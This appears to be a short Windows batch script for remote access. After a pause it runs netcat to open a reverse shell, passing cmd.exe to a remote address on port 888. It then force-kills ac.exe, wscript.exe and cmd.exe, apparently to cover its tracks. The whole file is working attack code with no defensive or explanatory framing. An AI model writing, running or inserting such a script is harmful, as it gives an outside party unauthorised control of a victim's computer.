@echo off


timeout /T 5 /NOBREAK 
nc ip 888 -e cmd.exe >> results



timeout /T 1 /NOBREAK 
taskkill /F /IM ac.exe


taskkill /F /IM wscript.exe
taskkill /F /IM cmd.exe


